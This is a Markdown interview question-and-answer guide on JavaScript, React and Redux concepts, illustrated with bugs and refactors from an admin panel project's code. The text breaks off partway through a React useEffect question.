# Admin Panel Interview Q&A — JavaScript, React & Data Structures

All questions reference actual code from `admin dev/piping_mart/piping-mart-admin-panel/src/`.

---

## Table of Contents

### Section A: JavaScript Core
- [JS-1 to JS-15: Closures, Promises, Async/Await, ES6+, Event Loop, Prototypes](#section-a-javascript-core)

### Section B: React Core
- [RC-1 to RC-15: Hooks, Lifecycle, Virtual DOM, Rendering, Reconciliation](#section-b-react-core)

### Section C: Redux & State Management
- [RX-1 to RX-10: Actions, Reducers, Middleware, Thunks, Store](#section-c-redux--state-management)

### Section D: Data Structures & Algorithms
- [DS-1 to DS-10: Arrays, Objects, Trees, Searching, Sorting in Project Context](#section-d-data-structures--algorithms)

### Section E: Security & Web Concepts
- [SW-1 to SW-5: XSS, CSRF, Auth, CORS, Storage](#section-e-security--web-concepts)

### Section F: Performance & Best Practices
- [PB-1 to PB-5: Memoization, Bundle Size, Lazy Loading, Re-renders](#section-f-performance--best-practices)

---

---

# Section A: JavaScript Core

---

## JS-1: What happens when `Promise.reject` is called without `return`?

**Project Code:** `services/api.service.js` lines 25–27
```javascript
error => {
    Promise.reject(error.response);  // Missing 'return'!
},
```

**Question:** This is the Axios request interceptor's error handler. What's the bug and what will happen at runtime?

**Answer:**
Without `return`, the interceptor's error callback returns `undefined` instead of the rejected promise. This means:
1. The promise chain continues as **resolved** with `undefined`
2. The `.catch()` block in the calling code **never fires**
3. The error is **silently swallowed** — requests appear to succeed with `undefined` data
4. Downstream code that does `const { data } = response` throws `TypeError: Cannot destructure property 'data' of undefined`

**Fix:**
```javascript
error => {
    return Promise.reject(error.response);
},
```

**Concept:** Promise chain propagation. Every `.then()` / interceptor handler must `return` a value or promise. If nothing is returned, the next handler receives `undefined` as a resolved value.

---

## JS-2: Explain `setTimeout` inside a Redux thunk — what's wrong?

**Project Code:** `services/auth/Basic/index.js` lines 25–56
```javascript
onLogin: ({ email, password }) => {
  return dispatch => {
    try {
      dispatch(setLoading());
      setTimeout(async () => {
        const response = await AuthService.login(email, password);
        // ... handle response
      }, 300);
    } catch (error) {
      ErrorCatch(error, FETCH_ERROR, dispatch);
    }
  };
};
```

**Question:** There are two bugs in this code. Can you spot them?

**Answer:**

**Bug 1: `try-catch` doesn't catch errors inside `setTimeout`.**
`setTimeout` schedules the callback on the **next event loop tick**. The `try-catch` only guards the synchronous `setTimeout()` call — not the async callback. If `AuthService.login()` throws, it becomes an **unhandled promise rejection**.

**Bug 2: Artificial 300ms delay.**
The `setTimeout(..., 300)` adds an unnecessary 300ms delay before the API call. The `setLoading()` dispatch before it means the spinner shows for at least 300ms even if the API responds instantly.

**Fix:**
```javascript
onLogin: ({ email, password }) => {
  return async (dispatch) => {
    try {
      dispatch(setLoading());
      const response = await AuthService.login(email, password);
      // ... handle response
    } catch (error) {
      ErrorCatch(error, FETCH_ERROR, dispatch);
    }
  };
};
```

**Concept:** JavaScript event loop — `setTimeout` callbacks run asynchronously. `try-catch` only catches synchronous errors and `await`-ed promise rejections.

---

## JS-3: What's the difference between optional chaining (`?.`) and regular property access?

**Project Code:** `redux/actions/Manage/Suppliers/Suppliers.js` lines 65–93
```javascript
const response = await Axios.post(`/supplier/fetch-all-supplier-admin`, { filter });
const { data } = response;
const total = data?.data?.length;
if (response.status === 200) { ... }
```

**Question:** Why does `data?.data?.length` use optional chaining but `response.status` doesn't? When would `response` be undefined here?

**Answer:**
- `response` is guaranteed to exist if `Axios.post()` resolves (no `?.` needed)
- `data?.data?.length` uses `?.` because the backend response structure may vary — `data.data` might be `null` or `undefined` if the API returns `{ status: 1, data: null }`
- If `response.data` is `null`, `data.data` would throw `TypeError: Cannot read property 'data' of null`
- Optional chaining short-circuits to `undefined` instead of throwing

**But there's a subtle bug:** `response.status` should also be checked with `?.` for network errors where Axios rejects — but since this is in a `try` block, rejections go to `catch`. However, if the response is a 404 or 500, Axios **does reject** by default, so the `if (response.status === 200)` check is redundant here.

**Concept:** Optional chaining (`?.`) returns `undefined` for nullish (`null`/`undefined`) base values instead of throwing. It's syntactic sugar for: `data && data.data && data.data.length`.

---

## JS-4: Explain destructuring with default values and renaming

**Project Code:** `services/auth/Basic/index.js` lines 37–39
```javascript
const { name, email, permissions, token, userId } = data?.user;
const userData = { name, email, userId };
```

And in `@jumbo/components/Common/authComponents/SignIn.js` line 59:
```javascript
const SignIn = ({ method = CurrentAuthMethod, variant = 'default', wrapperVariant = 'default' }) => {
```

**Question:** What happens if `data?.user` is `undefined`? How does destructuring with defaults work in the SignIn component?

**Answer:**

**Part 1:** If `data?.user` is `undefined`, the destructuring `const { name, email, ... } = undefined` throws `TypeError: Cannot destructure property 'name' of undefined`. Optional chaining doesn't protect against destructuring — you'd need:
```javascript
const { name, email, permissions, token, userId } = data?.user || {};
```

**Part 2:** In SignIn's props destructuring:
- `method = CurrentAuthMethod` — if `method` prop is `undefined` (not passed), it defaults to `CurrentAuthMethod`
- But if `method` is explicitly passed as `null`, the default does NOT apply — `null` is not `undefined`
- Default values only trigger for `undefined`, not for `null`, `0`, `""`, or `false`

**Concept:** Destructuring assignment, default values, and the difference between `null` and `undefined` in JavaScript defaults.

---

## JS-5: What's a closure and where is it used in this codebase?

**Project Code:** `@jumbo/utils/commonHelper.js` lines 61–91
```javascript
export const useDebounce = () => {
  let timeout;
  return (fn, delay = 300) => {
    clearTimeout(timeout);
    timeout = setTimeout(fn, delay);
  };
};
```

**Question:** Identify the closure. What would happen if `timeout` was declared inside the returned function instead?

**Answer:**
The closure is the returned function `(fn, delay) => { ... }` which **closes over** the `timeout` variable from the outer `useDebounce` scope.

- `timeout` persists across multiple calls to the returned function because it lives in the closure's scope
- Each call to `clearTimeout(timeout)` cancels the previous timer
- This is how debouncing works — only the last call within `delay` ms actually executes

**If `timeout` was inside the returned function:**
```javascript
return (fn, delay = 300) => {
  let timeout;  // NEW variable every call — previous one lost!
  clearTimeout(timeout);  // Always clearing undefined — does nothing
  timeout = setTimeout(fn, delay);
};
```
Every invocation would create a new `timeout`, so `clearTimeout` would clear nothing. All calls would fire — no debouncing.

**Concept:** Closures capture references to outer variables, not copies. The variable persists as long as the inner function exists.

---

## JS-6: What's the difference between `.then().catch()` and `async/await` with `try/catch`?

**Project Code:** Both patterns exist side-by-side in `redux/actions/Manage/Suppliers/Suppliers.js`:

**Pattern 1 — Promise chain (line 158):**
```javascript
export const deleteSupplier = supplierId => {
  return dispatch => {
    dispatch(setLoading(SUPPLIER_DELETE_REQUEST));
    return Axios.get(`supplier/deactivate-supplier/${supplierId}`)
      .then(response => { /* success */ })
      .catch(err => {
        dispatch(setError(MSG_ERR_RESPONDING_SERVER, SUPPLIER_DELETE_FAILED));
        return Promise.resolve(err);  // ← Bug!
      });
  };
};
```

**Pattern 2 — async/await (line 477):**
```javascript
export const deleteSupplierDetail = userId => async dispatch => {
  try {
    dispatch(setLoading());
    const response = await Axios.delete(`/supplier/deleteSupplierdata/${userId}`);
    if (response.status === 200) {
      dispatch(setSuccess("User Deleted Successfully"));
    }
    dispatch(hideLoading());
    return Promise.resolve();
  } catch (error) {
    dispatch(setError(error?.data?.message));
  }
};
```

**Question:** What's the bug in Pattern 1's `.catch()` block? Why does `return Promise.resolve(err)` in a `.catch()` cause problems?

**Answer:**
`return Promise.resolve(err)` inside `.catch()` **converts a rejection into a resolution**. The caller's `.then()` will fire with the error object as data. This means:

```javascript
dispatch(deleteSupplier(id)).then(() => {
  // This runs EVEN ON ERROR because catch resolved the promise
  dispatch(getAllSupplier(...));  // Refreshes table after failed delete
});
```

The table refreshes as if the delete succeeded, but the supplier still exists. The fix:
```javascript
.catch(err => {
  dispatch(setError(MSG_ERR_RESPONDING_SERVER, SUPPLIER_DELETE_FAILED));
  return Promise.reject(err);  // Keep it rejected
});
```

**Concept:** Promise chains — `.catch()` returning a value converts the promise to resolved. To keep it rejected, `throw` or return `Promise.reject()`.

---

## JS-7: What is `JSON.parse(null)` vs `JSON.parse(undefined)` vs `JSON.parse("")`?

**Project Code:** `routes/index.js` line 81
```javascript
const authUser = JSON.parse(localStorage.getItem('auth-token'));
```

**Question:** `localStorage.getItem('nonexistent-key')` returns `null`. What happens with `JSON.parse(null)`? What if the stored value is corrupted?

**Answer:**
| Input | Result |
|-------|--------|
| `JSON.parse(null)` | `null` (safe — null is valid JSON) |
| `JSON.parse(undefined)` | `SyntaxError` |
| `JSON.parse("")` | `SyntaxError: Unexpected end of JSON input` |
| `JSON.parse("undefined")` | `SyntaxError` |
| `JSON.parse("{broken")` | `SyntaxError` |
| `JSON.parse('"hello"')` | `"hello"` (valid JSON string) |
| `JSON.parse("123")` | `123` (valid JSON number) |

So `localStorage.getItem()` returning `null` is safe. But if someone manually sets `localStorage.setItem('auth-token', 'undefined')`, the app crashes with no error boundary to catch it.

**Safe pattern:**
```javascript
const safeParse = (key) => {
  try {
    return JSON.parse(localStorage.getItem(key));
  } catch {
    localStorage.removeItem(key);
    return null;
  }
};
```

**Concept:** `JSON.parse()` coerces its argument to string first. `String(null)` → `"null"` (valid JSON). `String(undefined)` → `"undefined"` (not valid JSON).

---

## JS-8: What are "thunks" and why does Redux need middleware for them?

**Project Code:** `redux/store/index.js` lines 17–20
```javascript
function configureStore(initialState = {}) {
  const store = createStore(
    reducers(history),
    initialState,
    bindMiddleware([routeMiddleware, thunk])
  );
  return store;
}
```

**Question:** Redux `dispatch()` only accepts plain objects. How does `redux-thunk` allow dispatching functions? Write a simplified thunk middleware.

**Answer:**
Redux thunk is a middleware that intercepts dispatched values. If the value is a function, it calls it with `dispatch` and `getState`. If it's an object, it passes it through.

**Simplified implementation:**
```javascript
const thunkMiddleware = store => next => action => {
  if (typeof action === 'function') {
    return action(store.dispatch, store.getState);
  }
  return next(action);
};
```

**Why it works with our code:**
```javascript
// This action returns a function, not an object
export const getAllSupplier = (filter) => async dispatch => {
  dispatch(setLoading(SUPPLIER_LIST_REQUEST));  // dispatch plain object
  const response = await Axios.post(...);
  dispatch({ type: SUPPLIER_LIST_SUCCESS, data: response.data });  // plain object
};

// When called: dispatch(getAllSupplier(filter))
// thunk intercepts → sees function → calls it with dispatch
```

**Concept:** Middleware pattern — functions that wrap `dispatch` to add behavior. Curried function signature: `store => next => action => ...`.

---

## JS-9: Explain the spread operator for immutable state updates

**Project Code:** `redux/reducers/Manage/Suppliers.js` lines 76–83
```javascript
case SUPPLIER_UPDATE_SUCCESS: {
  return {
    ...state,                    // Copy all existing state
    supplier: action.data,       // Overwrite specific field
    action: action.type,
    message: action.message,
    suppliers: state.suppliers.map(supplier =>
      supplier._id === action.data._id ? action.data : supplier,  // Replace one item
    ),
  };
}
```

**Question:** Why can't we just do `state.supplier = action.data; return state;`? What does the `.map()` pattern do?

**Answer:**

**Why immutability matters:**
- React uses **reference equality** (`===`) to detect state changes
- If you mutate the existing object and return it, `prevState === nextState` is `true`
- React/Redux won't detect the change → component won't re-render
- `{...state}` creates a **new object** → `prevState !== nextState` → re-render triggers

**The `.map()` pattern:**
```javascript
state.suppliers.map(supplier =>
  supplier._id === action.data._id ? action.data : supplier
)
```
This creates a **new array** where:
- Every item stays the same (`supplier`) EXCEPT
- The one matching `_id` gets replaced with `action.data`
- The original `state.suppliers` array is NOT mutated

**Alternative patterns:**
```javascript
// Delete: filter out the item
suppliers: state.suppliers.filter(s => s._id !== action.id)

// Add to beginning: spread existing + new
suppliers: [action.data, ...state.suppliers]

// Add to end:
suppliers: [...state.suppliers, action.data]
```

**Concept:** Immutability in Redux. Shallow copy with spread operator. Array `.map()` and `.filter()` for immutable updates.

---

## JS-10: What is event delegation and how does it relate to React?

**Project Code:** `components/CustomeTable/index.js` — renders rows with click handlers
```javascript
{row && row.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
  .map((elm, index) => (
    <CustomTableRow
      key={index}          // ← Bug: index as key
      elm={elm}
      onMenuClick={onUserMenuClick}  // Each row gets its own handler
    />
  ))}
```

**Question:** If you have 500 table rows, each with an onClick handler, how many event listeners are in the DOM? How would event delegation optimize this?

**Answer:**

**Without delegation:** 500 individual click handlers attached to 500 DOM nodes. Each consumes memory.

**With delegation:** 1 click handler on the parent `<tbody>`, using `event.target` to determine which row was clicked.

**However, in React this is mostly academic because:**
1. React uses **Synthetic Events** — a single event listener on the root DOM node
2. React's event system already implements delegation internally
3. The 500 "handlers" are JavaScript function references, not DOM event listeners
4. React attaches ONE native listener per event type at the root

**The real performance concern here is:**
- `key={index}` — if rows are reordered/filtered, React can't correctly match old elements to new ones
- Should use `key={elm._id}` for correct reconciliation

**Concept:** Event delegation — one listener on parent instead of many on children. React's Synthetic Event system already implements this.

---

## JS-11: What is the `class` keyword doing in this service?

**Project Code:** `services/token.service.js` lines 1–41
```javascript
class TokenService {
  getLocalRefreshToken() {
    const user = JSON.parse(localStorage.getItem("user"));
    return user?.refreshToken;
  }
  getLocalAccessToken() {
    const authToken = JSON.parse(localStorage.getItem("auth-token"));
    return authToken;
  }
  setUser(user) {
    localStorage.setItem("user", JSON.stringify(user));
    localStorage.setItem("auth-token", JSON.stringify(user.token));
  }
  removeUser() {
    localStorage.removeItem("user");
    localStorage.removeItem("auth-token");
  }
}
export default new TokenService();
```

**Question:** This is a class with no constructor, no state, and no `this` usage. Why is it a class? What pattern does `export default new TokenService()` create?

**Answer:**

**Why a class isn't needed here:** All methods are stateless — they just wrap `localStorage` calls. A plain object or individual exported functions would work identically:
```javascript
export const getLocalAccessToken = () => JSON.parse(localStorage.getItem("auth-token"));
export const setUser = (user) => { /* ... */ };
```

**What `export default new TokenService()` does:** Creates a **singleton**. Every file that imports this module gets the **same instance**. However, since there's no instance state (no `this.x`), the singleton adds no value.

**When a class IS useful:**
- When you need `this` state (instance variables)
- When you need inheritance (`extends`)
- When methods need to reference each other via `this`

**Concept:** JavaScript classes are syntactic sugar over prototypes. Singleton pattern via module exports. Over-engineering with classes when functions suffice.

---

## JS-12: What does `Promise.resolve()` at the end of an async function do?

**Project Code:** `redux/actions/Manage/Suppliers/Suppliers.js` lines 367–376
```javascript
export const ImageAdd = (payload) => async dispatch => {
  try {
    const response = await Axios.post(`/product/user-gallery-add`, payload);
    const { data } = response;
    console.log(data);
    return Promise.resolve();   // ← Is this necessary?
  } catch (error) {
    ErrorCatch(error, SUPPLIER_ADDPRODUCT_FAILED, dispatch);
  }
};
```

**Question:** Is `return Promise.resolve()` necessary inside an `async` function? What does an `async` function already return?

**Answer:**
**No, it's redundant.** An `async` function always returns a Promise:
- `return value` → `Promise.resolve(value)`
- `return Promise.resolve()` → `Promise.resolve(Promise.resolve())` → `Promise.resolve(undefined)` (unwraps automatically)
- No return → `Promise.resolve(undefined)`
- `throw error` → `Promise.reject(error)`

So `return Promise.resolve()` is identical to just `return` or nothing at all inside an `async` function.

**But there IS a subtle issue here:** If the catch block runs (API fails), the function returns `undefined` (no explicit return in catch). The caller's `.then()` will still fire with `undefined` — the error is swallowed.

**Concept:** `async` functions implicitly wrap return values in `Promise.resolve()`. `Promise.resolve(thenable)` unwraps nested promises.

---

## JS-13: Explain `Array.prototype.slice()` for pagination

**Project Code:** `components/CustomeTable/index.js` — pagination rendering
```javascript
row.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
  .map((elm, index) => (
    <CustomTableRow key={index} elm={elm} />
  ))
```

**Question:** If `row` has 100 items, `page` is 2, and `rowsPerPage` is 10, what does `slice()` return? What's the difference between `slice()` and `splice()`?

**Answer:**
```javascript
row.slice(2 * 10, 2 * 10 + 10)  →  row.slice(20, 30)
// Returns items at indices 20, 21, 22, ..., 29 (10 items = page 3)
```

| Feature | `slice(start, end)` | `splice(start, deleteCount, ...items)` |
|---------|---------------------|---------------------------------------|
| Mutates original? | No (returns new array) | Yes (modifies in place) |
| Return value | New array of extracted elements | Array of deleted elements |
| Use case | Read a portion | Insert/delete/replace |
| In Redux? | Safe for reducers | NEVER use in reducers |

**Why this is client-side pagination:** `slice()` runs on the full `row` array already loaded in memory. For 10,000 rows, all 10,000 are fetched from the API and stored in Redux — only 10 are displayed. Server-side pagination would fetch only 10 per page.

**Concept:** Array methods — `slice` is non-mutating (pure), `splice` is mutating (impure). Pure functions are required in Redux reducers.

---

## JS-14: What is `JSON.stringify()` doing to the token and why is it a bug?

**Project Code:** `services/auth/Basic/index.js` lines 39–41
```javascript
localStorage.setItem('auth-token', JSON.stringify(token));
```

Then in `services/token.service.js` line 9:
```javascript
getLocalAccessToken() {
    const authToken = JSON.parse(localStorage.getItem("auth-token"));
    return authToken;
}
```

Then in `services/api.service.js` line 15:
```javascript
axiosConfig.headers['auth'] = `${token}`;
```

**Question:** If `token` is the string `"abc123"`, what gets stored in localStorage? What gets sent as the header?

**Answer:**
1. `JSON.stringify("abc123")` → `'"abc123"'` (a string WITH quotes)
2. `localStorage.setItem('auth-token', '"abc123"')` → stores `"abc123"` (with quotes)
3. `JSON.parse('"abc123"')` → `"abc123"` (back to string without outer quotes)
4. Template literal `` `${token}` `` → `"abc123"` → sent as header value

**So it works, but unnecessarily.** The token is a plain string. `JSON.stringify` + `JSON.parse` is adding a round-trip of serialization for no reason. Simpler:
```javascript
localStorage.setItem('auth-token', token);        // Store string directly
const token = localStorage.getItem('auth-token');  // Read string directly
```

**But what if token was an object?** Then `JSON.stringify` IS needed. The bug is treating a string as if it might be complex data.

**Concept:** `JSON.stringify` converts JS values to JSON strings. For strings, it adds escape quotes. `JSON.parse` reverses it. For primitive strings, this is unnecessary overhead.

---

## JS-15: What is the `typeof` operator and how does type coercion work in comparisons?

**Project Code:** `redux/actions/Auth.js` lines 3–14
```javascript
export const setAuthUser = user => {
  let authUser;
  if (user && !user.token) {
    authUser = { token: "", user: user };
  } else {
    authUser = { token: "", user: user };
  }
  return dispatch => {
    dispatch({
      type: UPDATE_AUTH_USER,
      payload: authUser ? authUser : user,
    });
  };
};
```

**Question:** Both branches of the `if/else` do the same thing. What values of `user` would make `user && !user.token` truthy vs falsy? Is there a bug?

**Answer:**

**Yes, this is a bug — both branches are identical.** The intent was likely:
```javascript
if (user && !user.token) {
  authUser = { token: "", user: user };         // Add empty token
} else {
  authUser = { token: user.token, user: user }; // Use existing token
}
```

**Truth table for `user && !user.token`:**
| `user` | `user.token` | `user && !user.token` | Branch |
|--------|-------------|----------------------|--------|
| `null` | N/A | `false` | else |
| `undefined` | N/A | `false` | else |
| `{ name: "a" }` | `undefined` | `true` | if |
| `{ token: "" }` | `""` | `true` (empty string is falsy) | if |
| `{ token: "abc" }` | `"abc"` | `false` | else |

**Concept:** Truthy/falsy values in JavaScript. Short-circuit evaluation with `&&`. Empty string `""`, `0`, `null`, `undefined`, `NaN` are falsy.

---

---

# Section B: React Core

---

## RC-1: Why does `useEffect` need a dependency array?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` lines 376–380
```javascript
useEffect(() => {
  let params = { search: searchTerm };
  dispatch(getAllSupplier(params), () => {
    setproductsFetched(true);
  });
}, [dispatch, searchTerm, dataUpdated]);
```

**Question:** What happens if you remove the dependency array? What if you pass `[]`? What does each dependency trigger?

**Answer:**

| Dependency Array | Behavior |
|-----------------|----------|
| No array: `useEffect(() => {...})` | Runs on **every render** — API called infinitely |
| Empty: `useEffect(() => {...}, [])` | Runs **once** on mount — never refetches when search changes |
| `[dispatch, searchTerm, dataUpdated]` | Runs when any of these **change by reference** |

**What each dependency does:**
- `dispatch` — stable reference from `useDispatch()` (never changes, but ESLint requires it)
- `searchTerm` — when user types in search box, triggers API refetch
- `dataUpdated` — toggled after CRUD operations to force table refresh

**The eslint rule `react-hooks/exhaustive-deps` is OFF** in this project (`.eslintrc.json`), so missing dependencies won't warn — but will cause stale closures.

**Concept:** `useEffect` compares dependencies using `Object.is()` (strict reference equality). Functions and objects create new references each render unless memoized.

---

## RC-2: What is a "controlled component" vs "uncontrolled component"?

**Project Code:** `@jumbo/components/Common/authComponents/SignIn.js` lines 59–61, 110–120
```javascript
const [email, setEmail] = useState('');
const [password, setPassword] = useState('');

// In JSX:
<AppTextInput
  onChange={event => setEmail(event.target.value)}
  defaultValue={email}    // ← Bug: should be 'value' for controlled
/>
```

**Question:** This uses `defaultValue` instead of `value`. Is this a controlled or uncontrolled component? What's the difference?

**Answer:**

| Prop | Type | React Controls Value? | Re-renders update input? |
|------|------|----------------------|--------------------------|
| `value={email}` | Controlled | Yes — React is source of truth | Yes |
| `defaultValue={email}` | Uncontrolled | No — DOM is source of truth | Only on initial render |

**The bug:** Using `defaultValue` with `onChange` + `useState` means:
- Initial render: input shows `email` state value
- User types: `onChange` updates `email` state
- But `defaultValue` only applies on **first render** — subsequent state changes don't update the input
- If you programmatically reset `email` to `""`, the input still shows old text

**Fix:**
```javascript
<AppTextInput value={email} onChange={event => setEmail(event.target.value)} />
```

**Concept:** Controlled components have React as single source of truth via `value` prop. Uncontrolled components let the DOM manage state via `defaultValue`/`ref`.

---

## RC-3: What is the difference between `React.memo`, `useMemo`, and `useCallback`?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` — no memoization used
```javascript
const Supplier = ({ history }) => {
  // 25+ useState hooks
  // Multiple useEffect hooks
  // Complex render logic

  const getUserActions = user => {  // Recreated every render
    const actions = [];
    actions.push({ action: 'url', label: 'View Live', icon: <Link /> });
    // ... 6 more pushes
    return actions;
  };

  const userActions = getUserActions(row);  // Called every render
  // ...
};
```

**Question:** This component has 25+ state variables. Every state change re-renders everything. How would you optimize?

**Answer:**

| Tool | What it memoizes | Usage |
|------|-----------------|-------|
| `React.memo(Component)` | Entire component output | Skips re-render if props haven't changed |
| `useMemo(() => value, [deps])` | Computed value | Caches expensive calculations between renders |
| `useCallback((args) => {...}, [deps])` | Function reference | Prevents child re-renders when passing callbacks as props |

**Optimizations for this component:**
```javascript
// 1. Memoize action list (doesn't change per render)
const userActions = useMemo(() => getUserActions(row), [row]);

// 2. Memoize callbacks passed to children
const handlePageChange = useCallback((event, newPage) => {
  setPage(newPage);
}, []);

// 3. Memoize child components
const MemoizedCustomTable = React.memo(CustomTable);

// 4. Extract sub-components to prevent full re-render
const SupplierActions = React.memo(({ elm, onMenuClick }) => (
  <CmtDropdownMenu onItemClick={menu => onMenuClick(menu, elm)} />
));
```

**Concept:** React re-renders a component when state or props change. Memoization prevents unnecessary re-renders by caching previous results.

---

## RC-4: What is a Higher-Order Component (HOC) and where is it used?

**Project Code:** `routes/index.js` lines 80–104
```javascript
const RestrictedRoute = ({ component: Component, ...rest }) => {
  const authUser = JSON.parse(localStorage.getItem('auth-token'));
  return (
    <Route
      {...rest}
      render={props =>
        authUser ? (
          <Component {...props} />
        ) : (
          <Redirect to={{ pathname: '/signin', state: { from: props.location } }} />
        )
      }
    />
  );
};
```

**Question:** Is `RestrictedRoute` a HOC? What pattern is it using? How does `{ component: Component, ...rest }` work?

**Answer:**

**Not technically a HOC.** A HOC is a function that takes a component and returns a new component: `const Enhanced = withAuth(Component)`. RestrictedRoute is a **wrapper component** that uses the **render prop pattern** via React Router's `render` prop.

**Destructuring trick:**
```javascript
{ component: Component, ...rest }
```
- Renames `component` prop to `Component` (capitalized — required for JSX)
- Collects all remaining props into `rest` (like `path`, `exact`)
- `<Route {...rest}>` spreads `path`, `exact`, etc. onto the Route

**Auth flow:**
1. Check localStorage for token
2. Token exists → render the protected Component
3. No token → Redirect to `/signin` with return URL in `state.from`

**The bug:** This reads localStorage on every render (synchronous). If the token is invalid (expired), the user sees the page briefly before the 401 interceptor redirects.

**Concept:** Render props pattern, prop renaming in destructuring, spread operator for forwarding props.

---

## RC-5: What are React keys and why is `key={index}` problematic?

**Project Code:** `@coremat/CmtGridView/GridView.js` line 91
```javascript
data.map((item, index) => (
    <div key={index} className={clsx(classes.columnCount, 'Cmt-column-count')}>
        {renderRow(item, index)}
    </div>
))
```

**Question:** When is `key={index}` okay and when does it break? Give a concrete example of broken behavior.

**Answer:**

**When index keys break — scenario:**
```
Before filter:  [Apple(0), Banana(1), Cherry(2)]
After filter:   [Apple(0), Cherry(1)]  // Cherry gets key=1 (was Banana's key!)
```
React sees key=1 had "Banana" and now has "Cherry". Instead of removing Banana and keeping Cherry, it **updates Banana's content to Cherry** — keeping Banana's internal state (input values, scroll position, animations).

**When index keys are OK:**
1. List is static (never reordered, filtered, or sorted)
2. Items have no internal state (no inputs, no expanded/collapsed)
3. Items are never inserted/deleted in the middle

**This project's impact:** The admin panel has sortable, filterable, paginated tables. Using index keys means:
- Sorting by column → wrong data appears in wrong row states
- Pagination → page 2 reuses page 1's component instances

**Fix:**
```javascript
data.map((item) => (
    <div key={item._id || item.id}>
        {renderRow(item)}
    </div>
))
```

**Concept:** React uses keys to match old elements with new elements during reconciliation. Stable, unique keys enable efficient DOM updates.

---

## RC-6: Explain React Context vs Redux — when to use which?

**Project Code:** The app uses BOTH:
- **Redux:** `redux/store/index.js` — for data (suppliers, products, auth)
- **Context:** `@jumbo/components/contextProvider/AppContextProvider/index.js` — for theme/locale
```javascript
// Context (theme)
const AppContext = createContext();
// Provides: locale, theme, layout, direction

// Redux (data)
combineReducers({
  Suppliers, Products, Users, Emails, auth, ...
});
```

**Question:** Why does this project use Redux for suppliers but Context for theme? What's the tradeoff?

**Answer:**

| Feature | Redux | Context |
|---------|-------|---------|
| Re-renders | Only subscribed components | ALL consumers re-render on ANY change |
| DevTools | Time-travel debugging, action log | No built-in debugging |
| Middleware | Thunks, sagas, logging | None |
| Boilerplate | Action types + creators + reducers | Just Provider + useContext |
| Best for | Frequent updates, complex state, async | Rare updates, read-heavy (theme, locale) |

**Why theme uses Context:** Theme changes are rare (user picks light/dark once). All components need theme colors. Simple read-only access.

**Why suppliers use Redux:** Frequent CRUD operations. Multiple components read/write supplier data. Async API calls need middleware (thunks). Action logging helps debugging.

**Context performance trap:** If you put suppliers in Context, every keystroke in the search box would re-render ALL components that use `useContext(SupplierContext)` — not just the table.

**Concept:** React Context is not a replacement for Redux. Context is for dependency injection (providing values). Redux is for state management (updating values predictably).

---

## RC-7: What is prop drilling and how do you solve it?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` passes many props to children:
```javascript
<CustomTable
  TableName="suppliers"
  downloadTableBtn={exportPermission ? true : false}
  fileName="suppliers.xlsx"
  fileHeaders={fileHeaders}
  fileData={fileData}
  row={suppliers && suppliers}
  headCells={headCells}
  order={order}
  orderBy={orderBy}
  onRequestSort={handleRequestSort}
  count={total}
  rowsPerPage={perPage}
  onPageChange={handlePageChange}
  page={page}
  searchTerm={searchTerm}
  setSearchTerm={setSearchTerm}
  handleSearch={handleSearch}
  handleViewDialog={handleViewDialog}
  productDetailModal={{ /* nested object with 8 props */ }}
/>
```

**Question:** CustomTable receives 20+ props. Is this prop drilling? How would you refactor?

**Answer:**

**This is not prop drilling** — it's a single level. Prop drilling is passing props through **multiple intermediate components** that don't use them:
```
Supplier → TabPanel → TabContent → GalleryGrid → ImageCard  // Each passes 'supplierId' down
```

**But 20+ props IS a code smell.** Solutions:

**1. Composition — pass children instead of config:**
```javascript
<CustomTable data={suppliers} pagination={{ page, count, rowsPerPage, onPageChange }}>
  <TableColumns>{headCells}</TableColumns>
  <TableToolbar onSearch={handleSearch} />
</CustomTable>
```

**2. Custom hook — extract table logic:**
```javascript
const tableProps = useSupplierTable(suppliers, searchTerm);
<CustomTable {...tableProps} />
```

**3. Context — for deeply nested access:**
```javascript
<SupplierContext.Provider value={{ supplierId, refreshData }}>
  <SupplierTabs />
</SupplierContext.Provider>
```

**Concept:** Prop drilling is passing data through components that don't need it. Solutions: Context, composition, custom hooks, or state management libraries.

---

## RC-8: What is `useSelector` and how does it prevent unnecessary re-renders?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` lines 63–68
```javascript
const { user } = useSelector(({ auth }) => auth.authUser);
const { suppliers, count, total, perPage } = useSelector(state => state.Suppliers);
const SupplierData = useSelector(state => state.Suppliers);
```

**Question:** There are two selectors reading from `state.Suppliers`. One destructures, one doesn't. What's the performance difference?

**Answer:**

`useSelector` uses **strict reference equality** (`===`) to decide if the component should re-render.

**Selector 1 (destructured):**
```javascript
const { suppliers, count, total, perPage } = useSelector(state => state.Suppliers);
```
Returns the `state.Suppliers` **object** → re-renders whenever ANY field in `Suppliers` changes (even `action` or `message` which aren't used).

**Selector 2 (whole object):**
```javascript
const SupplierData = useSelector(state => state.Suppliers);
```
Same as Selector 1 — returns the same object reference.

**Both are suboptimal.** The destructuring happens AFTER `useSelector` returns, so both compare the same reference.

**Optimized approach:**
```javascript
const suppliers = useSelector(state => state.Suppliers.suppliers);
const total = useSelector(state => state.Suppliers.total);
```
Now each selector returns a specific field. Re-renders only when THAT field changes.

**Or use `shallowEqual`:**
```javascript
import { shallowEqual } from 'react-redux';
const { suppliers, total } = useSelector(
  state => ({ suppliers: state.Suppliers.suppliers, total: state.Suppliers.total }),
  shallowEqual
);
```

**Concept:** `useSelector` compares previous and next return values with `===`. Returning objects always creates new references → always re-renders. Use primitive selectors or `shallowEqual`.

---

## RC-9: What happens when you call `setState` inside `useEffect`?

**Project Code:** `routes/Pages/Manage/Users/AddEditUser/index.js` lines 84–91
```javascript
useEffect(() => {
  if (user) {
    const { name, mobileNo, email, address } = user;
    setUserDetail({ name, mobileNo, email, address });  // setState inside useEffect
  }
}, [user]);
```

**Question:** Does calling `setUserDetail` inside `useEffect` cause an infinite loop? When would it?

**Answer:**

**No infinite loop here** because `user` (the dependency) comes from Redux — its reference only changes when a new user is selected. `setUserDetail` updates local state, which doesn't affect `user`.

**When it WOULD loop:**
```javascript
const [data, setData] = useState([]);
useEffect(() => {
  setData([...data, newItem]);  // data changes → useEffect fires → setData → loop!
}, [data]);  // data is both read and written
```

**Another common trap:**
```javascript
useEffect(() => {
  const filtered = items.filter(i => i.active);
  setFilteredItems(filtered);  // Creates new array every time
}, [items]);  // OK if items reference is stable

